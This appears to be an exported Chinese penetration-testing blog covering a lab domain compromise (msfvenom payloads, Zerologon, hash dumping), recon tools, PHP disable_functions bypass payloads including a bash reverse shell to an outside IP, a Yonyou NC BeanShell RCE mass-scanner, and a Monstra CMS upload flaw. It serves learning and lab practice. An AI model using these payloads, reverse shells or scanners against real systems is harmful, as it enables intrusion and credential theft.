<p><img src="https://s2.loli.net/2022/11/04/LC6UnaOqei4zrxu.png" alt="image.png"></p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="对Win2016进行Redis未授权"><a href="#对Win2016进行Redis未授权" class="headerlink" title="对Win2016进行Redis未授权"></a>对Win2016进行Redis未授权</h2><p>这里发现存在另一张网卡</p>
<p><img src="https://s2.loli.net/2022/11/04/PTsyKbzx1hoYkGj.png" alt="image.png"></p>
<p>获取Window7密码</p>
<p><img src="https://s2.loli.net/2022/11/04/HGgVtBvhIr7yKL2.png" alt="image.png"></p>
<p>使用proxychains4代理，访问redis的未授权</p>
<p><img src="https://s2.loli.net/2022/11/04/K5woYLIgaUcz8MW.png" alt="image.png"></p>
<p>这里有个槽点，就是VMWARE放两张仅主机网卡，原本设置IP为10的网卡却变成了20，为此这个细节花了整整一大半时间，我寻思这仅主机配的也没错呀，原来不是代理慢问题。。。</p>
<p>代理查找开放端口</p>
<p><img src="https://s2.loli.net/2022/11/04/aZt36uwkOmLSipU.png" alt="image.png"></p>
<p>存在网页，返回hello world</p>
<p><img src="https://s2.loli.net/2022/11/04/aSUQ26fAueWhXGO.png" alt="image.png"></p>
<p>对Redis进行未授权攻击</p>
<p><img src="https://s2.loli.net/2022/11/04/gvZPzBLDKbqd8pR.png" alt="image.png"></p>
<p>这里需要知道Web的目录路径才可以写入一句话</p>
<p><img src="https://s2.loli.net/2022/11/04/sfiwtQPAzW5YoF1.png" alt="image.png"></p>
<p>蚁剑挂代理</p>
<p><img src="https://s2.loli.net/2022/11/04/3LU8JPxmc9hgG1j.png" alt="image.png"></p>
<p>连接小马</p>
<p><img src="https://s2.loli.net/2022/11/04/KN5XeAcypYP9UGS.png" alt="image.png"></p>
<p>查看网卡，存在另一个网段，域vulntarget.com</p>
<p><img src="https://s2.loli.net/2022/11/04/GANuCEWyM9n8qKS.png" alt="image.png"></p>
<h2 id="挂多层代理"><a href="#挂多层代理" class="headerlink" title="挂多层代理"></a>挂多层代理</h2><p>想Window2016，有多种方法</p>
<ol>
<li>通过上传小马到启动项里，然后用CS开启监听</li>
<li>不出网监听</li>
</ol>
<blockquote>
<p>CS二层代理过不去关，我用MSF做二层，正向和反向皆不行，是因为在kali这层并未做代理，让kali能与10.0.20.0&#x2F;24这个网段相互通，所以重新用MSF做一层代理再跳二层</p>
</blockquote>
<p>Msf反向连接win7，先生成后门</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.246 LPORT=1111 -f exe &gt; /home/f1.exe
</code></pre>
<p><img src="https://s2.loli.net/2022/11/10/7o9YKA3XfzLIchP.png" alt="image.png"></p>
<p>查看子网网段</p>
<p><img src="https://s2.loli.net/2022/11/10/7TCshbtDmrH3Yil.png" alt="image.png"></p>
<p>添加路由</p>
<p><img src="https://s2.loli.net/2022/11/10/zKHwFrkBPGRWaNT.png" alt="image.png"></p>
<p>查看已添加的路由</p>
<p><img src="https://s2.loli.net/2022/11/10/DAczkF4r7mhd5wB.png" alt="image.png"></p>
<p>添加socks5代理</p>
<p><img src="https://s2.loli.net/2022/11/10/v64PikxdAwZngrR.png" alt="image.png"></p>
<p>修改proxychain.conf</p>
<p><img src="https://s2.loli.net/2022/11/10/rTikDfs7CeR9gGW.png" alt="image.png"></p>
<p>对10.0.20.99进行curl</p>
<p><img src="https://s2.loli.net/2022/11/10/WtEjOI7bUxeudMs.png" alt="image.png"></p>
<p>使用arp -a发现10.0.20.99</p>
<p><img src="https://s2.loli.net/2022/11/10/mxBZGRaIkYFLSqJ.png" alt="image.png"></p>
<p>配置蚁剑的代理服务器</p>
<p><img src="https://s2.loli.net/2022/11/10/TS5pKzHXeq9FrJB.png" alt="image.png"></p>
<p>按照上面的Redis未授权写进shell，小马连接</p>
<p>正向连接生成木马</p>
<pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=8090 -f exe &gt; 8090_bind.exe
</code></pre>
<p>设置规则</p>
<pre><code>netsh advfirewall firewall add rule name=&quot;bind tcp&quot; protocol=TCP dir=in localport=8090 action=allow
</code></pre>
<p><img src="https://s2.loli.net/2022/11/10/3iIjopxcrqJ71AR.png" alt="image.png"></p>
<p>发现存在10.0.10.0&#x2F;24网段</p>
<p><img src="https://s2.loli.net/2022/11/10/27mUQPWEToNflYg.png" alt="image.png"></p>
<p>查看主机路由</p>
<p><img src="https://s2.loli.net/2022/11/10/enPsiVp1Q5h2G8x.png" alt="image.png"></p>
<p>添加到10.0.10.0&#x2F;24的路由</p>
<p><img src="https://s2.loli.net/2022/11/10/UKCc1SFODuEjbqB.png" alt="image.png"></p>
<p>查看域管理员为administrator</p>
<p><img src="https://s2.loli.net/2022/11/10/s6cAtRUNOzefi7F.png" alt="image.png"></p>
<p>查看域控制器计算机为Win2019$</p>
<p><img src="https://s2.loli.net/2022/11/10/MT3AOX8BKLqkfPw.png" alt="image.png"></p>
<h2 id="CVE-2020-1472提权到域控"><a href="#CVE-2020-1472提权到域控" class="headerlink" title="CVE-2020-1472提权到域控"></a>CVE-2020-1472提权到域控</h2><p>使用漏洞将密码制空，EXP地址<a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
<p>还得添加路由和迁移进程</p>
<p><img src="https://s2.loli.net/2022/11/10/Q5EzJOWBmSUPRTf.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/11/10/2Gj95JbfOCh1ydF.png" alt="image.png"></p>
<p>再使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py%EF%BC%8C%E5%B0%86hash%E5%80%BCdump%E5%87%BA%E6%9D%A5">https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py，将hash值dump出来</a></p>
<p><img src="https://s2.loli.net/2022/11/10/osaVgeH32F7TOcQ.png" alt="image.png"></p>
<p>拿join工具获得Window2019开机密码为Admin@666</p>
<p>使用smbexec拿到域控的shell</p>
<p><img src="https://s2.loli.net/2022/11/10/IGmeZan2zFhV7qk.png" alt="image.png"></p>
<p>跟上面一样，把小马发给wind2016上，防火墙设置允许端口入站</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://cloud.tencent.com/developer/article/1954759">https://cloud.tencent.com/developer/article/1954759</a></p>
<p><a href="https://blog.csdn.net/weixin_48421613/article/details/123626822">https://blog.csdn.net/weixin_48421613/article/details/123626822</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2022/11/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="域名查询"><a href="#域名查询" class="headerlink" title="域名查询"></a><strong>域名查询</strong></h1><h2 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a><strong>Whois查询</strong></h2><p><strong>查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商、域名注册日期和过期日期等）</strong></p>
<p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
<p><img src="https://s2.loli.net/2022/11/02/Og1oqKRV3QcIuYs.png" alt="image.png"></p>
<p>相关的查询网址</p>
<pre><code>https://www.alibabacloud.com/zh/whois
https://www.whois365.com/cn/
https://whois.cloud.tencent.com/
https://whois.aliyun.com/
</code></pre>
<h2 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a><strong>备案信息查询</strong></h2><p><strong>域名可查询该域名是否有备案及相关的ICP备案许可信息</strong></p>
<p><a href="https://beian.miit.gov.cn/?spm=a2c4g.11186623.0.0.58793367Iev0wi">https://beian.miit.gov.cn/?spm=a2c4g.11186623.0.0.58793367Iev0wi</a></p>
<p><img src="https://s2.loli.net/2022/11/02/MZJlPhA1S9arEY2.png" alt="image.png"></p>
<pre><code>http://icp.chinaz.com/
http://www.jucha.com/beian/
</code></pre>
<h2 id="Whois反查"><a href="#Whois反查" class="headerlink" title="Whois反查"></a>Whois反查</h2><pre><code>https://www.cxw.com/rewhois
http://whois.4.cn/reverse
http://whois.bugscaner.com/
</code></pre>
<h1 id="获取二级域名"><a href="#获取二级域名" class="headerlink" title="获取二级域名"></a>获取二级域名</h1><h2 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a><strong>Layer子域名挖掘机</strong></h2><p><img src="https://s2.loli.net/2022/11/02/Jq9FkCyKD8XcQMf.png" alt="image.png"></p>
<h2 id="脚本挖掘"><a href="#脚本挖掘" class="headerlink" title="脚本挖掘"></a>脚本挖掘</h2><pre><code>#! /usr/bin/env python3
# _*_coding:utf-8 _*_
#usage:python 子域名挖掘.py   baidu.com 5
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse #解析URL的参数
import sys #对解释器使用或维护的一些变量的访问

def bing_search(site,pages):
    Subdomain= []  # 以列表形式存储子域名
    headers= &#123;&#39;User-Agent&#39;:
    &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&#39;,
    &#39;Accept&#39;: &#39;*/*&#39;,
    &#39;Referer&#39;:&#39;https://cn.bing.com&#39;,
    &#39;Cookie&#39;:&#39;SUID=M; MUID=1B9B796D5D9E6E7E269768145C4C6F54; MUIDB=1B9B796D5D9E6E7E269768145C4C6F54; _EDGE_S=F=1&amp;SID=07B2260067386F2B3B2F377966EA6E64; _EDGE_V=1; SRCHD=AF=QBLH; SRCHUID=V=2&amp;GUID=D783F274FD984E06978EA411DA50276F&amp;dmnchg=1; SRCHUSR=DOB=20220401&amp;T=1648804797000; SRCHHPGUSR=SRCHLANG=zh-Hans&amp;BRW=XW&amp;BRH=M&amp;CW=1536&amp;CH=711&amp;SW=1536&amp;SH=864&amp;DPR=1.25&amp;UTC=480&amp;DM=1&amp;EXLTT=1&amp;HV=1648804801&amp;WTS=63784401597; _SS=SID=07B2260067386F2B3B2F377966EA6E64; ZHCHATSTRONGATTRACT=TRUE; ipv6=hit=1648808402805&amp;t=4&#39;,
    &#125;
    for i in range(1,int(pages)+1):
        url=&quot;https://cn.bing.com/search?q=site%3A&quot;+site+&quot;&amp;qs=n&amp;form=QBRE&amp;sp=-1&amp;pq=site%3A&quot;+site+&quot;&amp;sc=1-17&amp;sk=&amp;cvid=F62DA717CE5347F384FF24C5C00A3F03&quot;
        html = requests.get(url,headers)
        soup =BeautifulSoup(html.content,&#39;html.parser&#39;)
        job_bt =soup.findAll(&#39;h2&#39;)    #参数找到h2
        for i in job_bt:
            link=i.a.get(&#39;href&#39;)
            domain=str(urlparse(link).scheme+&quot;://&quot;+ urlparse(link).netloc) #字符串，scheme协议，netloc服务器位置
            if domain in Subdomain:
                pass
            else:
                Subdomain.append(domain)
                print(domain)
if __name__ == &#39;__main__&#39;:
    if len(sys.argv) == 3: #URL输出两个参数
        site =sys.argv[1]
        page =sys.argv[2]

    else:
        print(&quot;usage:%s baidu.com 10&quot; % sys.argv[0]) #输出帮助信息
        sys.exit(-1)
    Subdomain = bing_search(site,page)
</code></pre>
<h2 id="TheHarvester"><a href="#TheHarvester" class="headerlink" title="TheHarvester"></a>TheHarvester</h2><p>kali自带，python3以上</p>
<pre><code>theHarvester -h  
</code></pre>
<p>常用语法</p>
<pre><code>-d：指定搜索的域名或网址
-b：指定采集信息的源（如baidu，biying，google）
-l：指定采集信息的返回数量，默认500
-f：输出文件名并保存采集结果，可以保存为HTML或XML格式；如果不指定，采集信息仅作屏幕显示
</code></pre>
<pre><code>theHarvester -d 4399.com -l 1000 -b baidu
</code></pre>
<pre><code>-d，--domain            要搜索的公司名称或域名。

-l,    --limit                 限制搜索结果的数量，默认=500。

-S,  --start                 从结果编号 X 开始，默认 = 0。

-g,  --google-dork     使用 Google Dorks 进行 Google 搜索。

-p,  --proxies            对请求使用代理，在 proxies.yaml 中输入代理。

-s,  --shodan            使用 Shodan 查询发现的主机。

--screenshot            对已解析的域进行截图，指定输出目录：--screenshot output_directory

-v,  --virtual-host      通过 DNS 解析验证主机名并搜索虚拟主机。

-e, --dns-server       用于查找的 DNS 服务器。

-f，--filename          将结果保存到 XML 和 JSON 文件。

-b, --source             指定搜索的引擎和数据源
</code></pre>
<h2 id="Amass"><a href="#Amass" class="headerlink" title="Amass"></a>Amass</h2><pre><code>五大参数：
    amass intel - 枚举发现目标
    amass enum  - 进行网络扫描和枚举
    amass viz   - 将枚举结果可视化
    amass track - 追踪枚举结果中的差异
    amass db    - 操作amass的图表数据库
每个参数下的支参数：
    intel：
        amass intel -h #获得amass intel所有参数
        amass intel -active 192.168.2.1-64 -p 80,443,80 #启动主动侦察方法
        amass intel -addr 192.168.2.1-64 #IP和范围（192.168.1.1-254），以逗号分隔
    enum：
        amass enum -brute -d example.com #执行暴力子域枚举
</code></pre>
<p><img src="https://s2.loli.net/2022/11/02/CWbv4swjcGPaenD.png" alt="image.png"></p>
<h2 id="在线子域名"><a href="#在线子域名" class="headerlink" title="在线子域名"></a><strong>在线子域名</strong></h2><pre><code>https://tool.chinaz.com/subdomain/
https://phpinfo.me/domain/
https://tools.yum6.cn/Tools/urlblast/
https://zhuanlan.zhihu.com/p/106705198 //23款子域名软件
</code></pre>
<h1 id="旁站收集"><a href="#旁站收集" class="headerlink" title="旁站收集"></a><strong>旁站收集</strong></h1><pre><code>站长之家
http://ip.tool.chinaz.com/Same/、http://www.webscan.cc/    http://www.5kik.com/c/
●
谷歌语法
site:211.69.130.*
●
Fofa、shodan
ip=&quot;211.69.130.0/24&quot;
●
御剑
</code></pre>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="内网（nmap端口扫描）"><a href="#内网（nmap端口扫描）" class="headerlink" title="内网（nmap端口扫描）"></a><strong>内网（nmap端口扫描）</strong></h2><pre><code>语法：nmap &lt;target ip address&gt;

commands：
    -vv 参数设置对结果的详细输出
    -p 扫描端口范围。-p 50-80  范围50到80          #nmap -p 50-80 192.168.1.1
    -sn 进行ping扫描 							  #nmap -sn 192.168.1.1
    -sP 扫描网段下的IP    						#nmap -sP 192.168.1.0/24 
    -O  操作系统指纹识别                          #nmap -O 192.168.1.1
    -A 多种扫描                                   #nmap -A 192.168.1.1
    -iL 扫描文本里所有的URL					      #Nmap –iL C:\Users\targets.txt

upgrade_commands:
    --script=auth 对目标主机或主机网段进行应用弱口令检测 #nmap --script=auth 192.168.1.1
    --script=brute 可对数据库，smb，snmap进行密码破解  #nmap --script=brute 192.168.1.1
    --script=vuln 扫描常见漏洞 #Nmap --script=vuln 192.168.1.1
    --script=realvnc-auth-bypass 扫描常见应用服务的扫描脚本 #nmap --script=realvnc-auth-bypass 192.168.1.1
    --script=broadcast 探测局域网内更多服务开启的情况 #Nmap –n –p 445 --script=broadcast 192.168.1.1
</code></pre>
<h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><pre><code>pip install shodan #下载shodan
shodan init [API_Key] #实例化
</code></pre>
<pre><code>hostname：搜索指定的主机或域名，例如 hostname:&quot;google&quot;
port：搜索指定的端口或服务，例如 port:&quot;21&quot;
country：搜索指定的国家，例如 country:&quot;CN&quot;
city：搜索指定的城市，例如 city:&quot;Hefei&quot;
org：搜索指定的组织或公司，例如 org:&quot;google&quot;
isp：搜索指定的ISP供应商，例如 isp:&quot;China Telecom&quot;
product：搜索指定的操作系统/软件/平台，例如 product:&quot;Apache httpd&quot;
version：搜索指定的软件版本，例如 version:&quot;1.6.2&quot;
geo：搜索指定的地理位置，参数为经纬度，例如 geo:&quot;31.8639, 117.2808&quot;
before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:&quot;11-11-15&quot;
net：搜索指定的IP地址或子网，例如 net:&quot;210.45.240.0/24&quot;
</code></pre>
<pre><code>shodan host 222.243.129.135 #查看指定主机的相关信息，如地理位置信息，开放端口，甚至是否存在某些漏洞等信息

shodan search --fields ip_str,port,org,hostnames tomcat country:cn --limit 10
#只显示IP、端口号、组织名称和主机名
</code></pre>
<h2 id="在线端口扫描"><a href="#在线端口扫描" class="headerlink" title="在线端口扫描"></a>在线端口扫描</h2><pre><code>https://tool.chinaz.com/port
http://coolaf.com/tool/port
https://hidemy.name/cn/port-scanner/
https://zh-hans.ipshu.com/scan_port
https://duankou.wlphp.com/
https://www.tool.cab/inquire/port.html
https://www.sojson.com/zz/portscan.html
</code></pre>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>disable_function绕过</title>
    <url>/2022/11/02/disable_function%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="LD-PRELOAD环境变量"><a href="#LD-PRELOAD环境变量" class="headerlink" title="LD_PRELOAD环境变量"></a>LD_PRELOAD环境变量</h1><p>LD_PRELOAD是Linux系统的一个环境变量，允许在程序运行前优先加载动态链接库。可以通过环境变量LD_PRELOAD劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p>
<p>利用条件</p>
<p>1、上传.so文件</p>
<p>2、控制LD_PRELOAD环境变量的值，比如putenv()函数</p>
<p>3、因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如mail()、imap_mail()、mb_send_mail()和error_log()函数等</p>
<p>拿到shell发现无法执行命令</p>
<p><img src="https://s2.loli.net/2022/11/02/HFMyOwQ43pEV2Ll.png" alt="image.png"></p>
<p>查看phpinfo</p>
<p><img src="https://s2.loli.net/2022/11/02/1LA2kr4xHwpsi6D.png" alt="image.png"></p>
<p>利用这几个脚本</p>
<pre><code>•bypass_disablefunc.php：一个用来执行命令的 webshell。

•bypass_disablefunc_x64.so或bypass_disablefunc_x86.so：执行命令的共享对象文件，分为64位的和32位的。

•bypass_disablefunc.c：用来编译生成上面的共享对象文件
</code></pre>
<p>把bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标有权限的目录中：</p>
<p><img src="https://s2.loli.net/2022/11/02/pjztqkD32XOxcFS.png" alt="image.png"></p>
<p>将bypass_disablefunc.php包含进来并使用GET方法提供所需的三个参数</p>
<pre><code>/?Ginkgo=aW5jbHVkZSgiL3Zhci90bXAvYnlwYXNzX2Rpc2FibGVmdW5jLnBocCIpOw==&amp;cmd=id&amp;outpath=/tmp/outfile123&amp;sopath=/var/tmp/bypass_disablefunc_x64.so
</code></pre>
<p><img src="https://s2.loli.net/2022/11/02/D4ftV2HGLlSUCqQ.png" alt="image.png"></p>
<h1 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h1><p>PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令</p>
<p>使用条件</p>
<p>​	1、Linux系统</p>
<p>​	2、7.0、7.1、7.2、7.3</p>
<p>利用脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
<p><img src="https://s2.loli.net/2022/11/02/1UCwAv7XKyFI2lr.png" alt="image.png"></p>
<p>将文件包含进来</p>
<pre><code>include(&quot;/var/tmp/CG_UAF.php&quot;); base aW5jbHVkZSgiL3Zhci90bXAvQ0dfVUFGLnBocCIpOw==
</code></pre>
<p><img src="https://s2.loli.net/2022/11/02/FsKbTR75SqkAvCu.png" alt="image.png"></p>
<h1 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h1><p>PHP 7.4 的 FFI（Foreign Function Interface），即外部函数接口，允许从用户在PHP代码中去调用C代码。</p>
<p>FFI需要声明和调用</p>
<pre><code>1.使用FFi::cdef()函数在PHP中声明一个我们要调用的这个C库中的函数以及使用到的数据类型
$ffi = FFI::cdef(&quot;int system(char* command);&quot;);   # 声明C语言中的system函数
2.返回一个新创建的FFI对象，然后使用以下方法即可调用这个对象中所声明的函数
$ffi -&gt;system(&quot;ls / &gt; /tmp/res.txt&quot;);   # 执行ls /命令并将结果写入/tmp/res.txt
</code></pre>
<p>利用条件</p>
<pre><code>•Linux 操作系统

•PHP &gt;= 7.4

•开启了 FFI 扩展且 ffi.enable=true
</code></pre>
<p>拿[极客大挑战 2020]Roamphp5-FighterFightsInvincibly这道题，也是无法执行系统命令</p>
<p><img src="https://s2.loli.net/2022/11/02/aJDAvimP4lLjXMO.png" alt="image.png"></p>
<p>查看disable_functions,禁用了很多函数</p>
<p><img src="https://s2.loli.net/2022/11/02/UGz4xiQsnPFtOL9.png" alt="image.png"></p>
<p>查到php版本为7.4，ffi.enable is on，可使用FFI扩展进行绕过disable_functions</p>
<h2 id="FFI调用C库的System函数"><a href="#FFI调用C库的System函数" class="headerlink" title="FFI调用C库的System函数"></a>FFI调用C库的System函数</h2><p>将文件写入tmp</p>
<pre><code>/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;ls / &gt; /tmp/res.txt&quot;);echo file_get_contents(&quot;/tmp/res.txt&quot;);/*
</code></pre>
<p>echo file_get_contents(“&#x2F;tmp&#x2F;res.txt”); 查看执行结果</p>
<p>反弹shell</p>
<pre><code>?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;&#39;)/*
</code></pre>
<h2 id="FFI调用C库的Popen函数"><a href="#FFI调用C库的Popen函数" class="headerlink" title="FFI调用C库的Popen函数"></a>FFI调用C库的Popen函数</h2><p>popen()函数会调用fork()产生子进程，然后从子进程中调用 &#x2F;bin&#x2F;sh -c 来执行参数 command 的指令</p>
<pre><code>?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1)&#123;$d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$ffi-&gt;pclose($o);echo hex2bin($d);/*
</code></pre>
<h2 id="利用FFI调用C库的php函数"><a href="#利用FFI调用C库的php函数" class="headerlink" title="利用FFI调用C库的php函数"></a>利用FFI调用C库的php函数</h2><pre><code>?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$ffi-&gt;php_exec(3,&quot;ls /&quot;);/*
</code></pre>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>用友 BeanShell命令执行</title>
    <url>/2022/11/01/NC/</url>
    <content><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a><strong>漏洞简介</strong></h1><p><strong>漏洞成因</strong></p>
<p>该漏洞为远程命令执行漏洞，由于用友NC对外开放了BeanShell接口，攻击者可以在无需经过身份验证的情况下直接访问该接口，并构造恶意数据执行任意命令，攻击成功可获得目标服务器权限</p>
<p><strong>漏洞编号</strong></p>
<p>CNVD-2021-30167</p>
<p><strong>漏洞版本</strong></p>
<p>用友NC：6.5</p>
<p><strong>Fofa查找</strong></p>
<p>Title &#x3D;&#x3D; “YONGYOU NC”</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>无需登录，URL访问测试接口</p>
<pre><code>url+/servlet/~ic/bsh.servlet.BshServlet
</code></pre>
<p>再输入框输入exec(“ipconfig”)，可命令执行</p>
<h1 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h1><pre><code># 检测单一站点是否存在漏洞
&#39;&#39;&#39;
import requests
url=&quot;http://111.33.38.101:8088&quot;
POC=&quot;/servlet/~ic/bsh.servlet.BshServlet&quot;
r=requests.get(url+POC,timeout=3)
if &quot;BeanShell Test Servlet&quot; in r.text:
    print (&quot;该网站存在漏洞&quot;)
else:
    print (&quot;无&quot;)
&#39;&#39;&#39;
#-- coding:UTF-8 --
# 检测多个站点是否存在漏洞，从txt里导出多个IP并写入另一个文档里。
import requests
import threadpool
import os
def exp(url):
   poc = r&quot;&quot;&quot;/servlet//~ic/bsh.servlet.BshServlet&quot;&quot;&quot;
   url = url + poc
   try:
       res = requests.get(url, timeout=3)
       if &quot;BeanShell&quot; in res.text:
           print(&quot;[*]存在漏洞的url：&quot; + url)
           with open (&quot;用友命令执行列表.txt&quot;, &#39;a&#39;) as f:
               f.write(url + &quot;\n&quot;)
   except:
       pass
def multithreading(funcname, params=[], filename=&quot;yongyou.txt&quot;, pools=10):
   works = []             #线程数组
   with open(filename, &quot;r&quot;) as f:
       for i in f:
           func_params = [i.rstrip(&quot;\n&quot;)] + params
           works.append((func_params, None))
   pool = threadpool.ThreadPool(pools)
   reqs = threadpool.makeRequests(funcname, works)
   [pool.putRequest(req) for req in reqs]
   pool.wait()
def main():
   if os.path.exists(&quot;用友命令执行列表.txt&quot;):
       f = open(&quot;用友命令执行列表.txt&quot;, &#39;w&#39;)
       f.truncate() #限制列出的字符串数量
   multithreading(exp, [], &quot;yongyou.txt&quot;, 10)
if __name__ == &#39;__main__&#39;:
   main()
</code></pre>
<p><img src="https://s2.loli.net/2022/11/01/GTKhazkW79j3QOy.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Nday复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Monstra V3.0.4 文件上传</title>
    <url>/2022/10/27/Monstra%20CMS%20v3.0.4%20%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>Monstra 是一个现代化的轻量级内容管理系统。它易于安装、升级和使用。</p>
<p>Monstra CMS 3.0.4版本中存在着一处安全漏洞，该漏洞源于程序没有正确验证文件扩展名。攻击者可以上传特殊后缀的文件执行任意PHP代码。</p>
<p><strong>编号</strong></p>
<p><em><strong>CVE-2020-13384</strong></em></p>
<p>漏洞成因</p>
<p>系统未对特殊后缀文件进行黑名单过滤，导致上传的特殊后缀以php执行</p>
<h1 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h1><p>跳转monstra-3.0.4\plugins\box\filesmanager\filesmanager.admin.php</p>
<p><img src="https://s2.loli.net/2022/10/27/yS8jECMZtR2KDiq.png" alt="image.png"></p>
<p>黑名单如下</p>
<pre><code>$forbidden_types = array(&#39;html&#39;, &#39;htm&#39;, &#39;js&#39;, &#39;jsb&#39;, &#39;mhtml&#39;, &#39;mht&#39;,
                                 &#39;php&#39;, &#39;phtml&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phps&#39;,
                                 &#39;shtml&#39;, &#39;jhtml&#39;, &#39;pl&#39;, &#39;py&#39;, &#39;cgi&#39;, &#39;sh&#39;, &#39;ksh&#39;, &#39;bsh&#39;, &#39;c&#39;, &#39;htaccess&#39;, &#39;htpasswd&#39;,&#39;exe&#39;, &#39;scr&#39;, &#39;dll&#39;, &#39;msi&#39;, &#39;vbs&#39;, &#39;bat&#39;, &#39;com&#39;, &#39;pif&#39;, &#39;cmd&#39;, &#39;vxd&#39;, &#39;cpl&#39;, &#39;empty&#39;);
</code></pre>
<p>move_upload_file函数</p>
<pre><code>if ($_FILES[&#39;file&#39;]) &#123;
                    if ( ! in_array(File::ext($_FILES[&#39;file&#39;][&#39;name&#39;]), $forbidden_types)) &#123;
                        $filepath = $files_path.Security::safeName(basename($_FILES[&#39;file&#39;][&#39;name&#39;], File::ext($_FILES[&#39;file&#39;][&#39;name&#39;])), null, false).&#39;.&#39;.File::ext($_FILES[&#39;file&#39;][&#39;name&#39;]);
                        $uploaded = move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $filepath);
                        if ($uploaded !== false &amp;&amp; is_file($filepath)) &#123;
                            Notification::set(&#39;success&#39;, __(&#39;File was uploaded&#39;, &#39;filesmanager&#39;));
                        &#125; else &#123;
                            $error = &#39;File was not uploaded&#39;;
                        &#125;
                    &#125; else &#123;
                        $error = &#39;Forbidden file type&#39;;
                    &#125;
                &#125; else &#123;
                    $error = &#39;File was not uploaded&#39;;
                &#125;
&#125;
</code></pre>
<p>黑名单缺少php2和php7，管理员配置不当，允许php7格式解析成php代码时，可以触发该漏洞</p>
<p>上传php7，文件保存路径在&#x2F;public&#x2F;upload&#x2F;</p>
<p><img src="https://s2.loli.net/2022/10/27/NVBef3a4Edb765S.png" alt="image.png"></p>
<p>php3、php4、php5标记文件特点，但后台仍将这个当作php解析，第一个版本从php3开始，所以没有php2</p>
<h1 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h1><p>任意注册，进入登陆页面</p>
<p><img src="https://s2.loli.net/2022/10/27/mAts2FibgDTeoZh.png" alt="image.png"></p>
<p>上传php7，apache并没有对php7进行解析</p>
<p><img src="https://s2.loli.net/2022/10/27/srUGkhvQ4aqMXby.png" alt="image.png"></p>
<p>使用phar上传的条件</p>
<pre><code>1.phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法
2.默认在php.ini打开
3.支持上传文件到服务端
</code></pre>
